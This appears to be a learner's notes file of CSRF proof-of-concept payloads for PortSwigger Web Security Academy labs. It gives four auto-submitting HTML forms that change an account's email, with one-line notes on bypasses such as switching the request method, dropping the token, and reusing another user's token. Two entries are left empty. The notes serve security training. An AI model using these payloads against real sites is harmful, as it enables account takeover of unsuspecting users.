# csrf

------------------------------------------ portswigger labs -----------------------------------------

(1)   <html>
       <body>
         <form method="POST" action="https://0a7400f004d0e204e725fd97008b00ee.web-security-academy.net/my-account/change-email">
           <input type="hidden" name="email" value="pwned@evil.com">
         </form>
         <script>
           setTimeout(() => { document.forms[0].submit(); }, 2000); 
         </script>
         </body>
      </html> 
------------------------------------------------------------------------------------------------------

catch the request using burp change method and try to change email if it changed -- it vuln --

(2)   <html>
        <body>
           <form action="https://0a0d00c404581742811bbb6100960076.web-security-academy.net/my-account/change-email">
           <input type="hidden" name="email" value="hacker@web-security.net">
           </form>
           <script>
                document.forms[0].submit();
           </script>
        </body>
      </html>

== didn't select method in html code ==
-------------------------------------------------------------------------------------------------------

try to remove CSRF token and change the email and if it changed -- it vuln --

(3)    <html>
         <body>
            <form method="POST" action="https://0a66000c04e95b6480d03ab4005e005f.web-security-academy.net/my-account/change-email">
            <input type="hidden" name="email" value="hacker2@web-security.net">
            </form>
            <script>
                  document.forms[0].submit();
            </script>
         </body>
       </html>

-------------------------------------------------------------------------------------------------------

if CSRF is for one time used 

(4)     <html>
         <body>
            <form method="POST" action="https://0aeb00030476d58c81d4f22000540009.web-security-academy.net/my-account/change-email">
            <input type="hidden" name="email" value="hacker3@web-security.net">
            <input type="hidden" name="csrf" value="pB2ZOOrT4e8lZCr4wgBamfe2ZMQ1F4fx">
            </form>
            <script>
                  document.forms[0].submit();
            </script>
         </body>
       </html>

== USE 	CSRF token to another person ==
-------------------------------------------------------------------------------------------------------


(5)    




--------------------------------------------------------------------------------------------------------

(6)    


